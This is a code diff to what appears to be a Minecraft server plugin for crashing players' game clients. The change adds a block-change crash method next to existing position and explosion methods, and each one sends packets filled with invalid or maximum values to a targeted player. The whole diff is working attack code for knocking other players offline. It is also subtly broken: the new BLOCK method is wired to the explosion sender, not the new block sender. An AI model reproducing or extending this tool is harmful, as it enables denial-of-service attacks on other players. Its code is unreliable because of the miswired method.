@@ -4,6 +4,8 @@ import com.deathmotion.playercrasher.enums.CrashMethod;
 import com.github.retrooper.packetevents.PacketEvents;
 import com.github.retrooper.packetevents.util.Vector3d;
 import com.github.retrooper.packetevents.util.Vector3f;
+import com.github.retrooper.packetevents.util.Vector3i;
+import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerBlockChange;
 import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
 import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPlayerPositionAndLook;
 import org.bukkit.entity.Player;
@@ -19,6 +21,7 @@ import java.util.function.Consumer;
 public class CrashService {
     private final WrapperPlayServerPlayerPositionAndLook positionPacket;
     private final WrapperPlayServerExplosion explosionPacket;
+    private final WrapperPlayServerBlockChange blockPacket;
     private Map<CrashMethod, Consumer<Player>> crashMethodActions;
 
     /**
@@ -29,6 +32,7 @@ public class CrashService {
 
         this.positionPacket = initPositionPacket();
         this.explosionPacket = initExplosionPacket();
+        this.blockPacket = initBlockPacket();
     }
 
     /**
@@ -97,25 +101,42 @@ public class CrashService {
     }
 
     /**
+     * Sends a block change packet to the targeted player.
+     *
+     * @param target the player to receive the packet
+     */
+    private void sendBlockPacket(Player target) {
+        PacketEvents.getAPI().getPlayerManager().sendPacket(target, blockPacket);
+    }
+
+    /**
      * Initializes actions for each crash method.
      */
     private void initCrashMethodActions() {
         this.crashMethodActions = new HashMap<>();
         this.crashMethodActions.put(CrashMethod.POSITION, this::sendPositionPacket);
         this.crashMethodActions.put(CrashMethod.EXPLOSION, this::sendExplosionPacket);
+        this.crashMethodActions.put(CrashMethod.BLOCK, this::sendExplosionPacket);
     }
 
     /**
-     * @return a new PlayerPositionAndLook packet with maximum values.
+     * @return a new PlayerPositionAndLook packet with invalid values.
      */
     private WrapperPlayServerPlayerPositionAndLook initPositionPacket() {
         return new WrapperPlayServerPlayerPositionAndLook(d(), d(), d(), f(), f(), b(), i(), false);
     }
 
     /**
-     * @return a new Explosion packet with maximum values.
+     * @return a new Explosion packet with invalid values.
      */
     private WrapperPlayServerExplosion initExplosionPacket() {
         return new WrapperPlayServerExplosion(new Vector3d(d(), d(), d()), f(), Collections.emptyList(), new Vector3f(f(), f(), f()));
+    }
+
+    /**
+     * @return a new BlockChange packet with maximum values.
+     */
+    private WrapperPlayServerBlockChange initBlockPacket() {
+        return new WrapperPlayServerBlockChange(new Vector3i(i(), i(), i()), i());
     }
 }
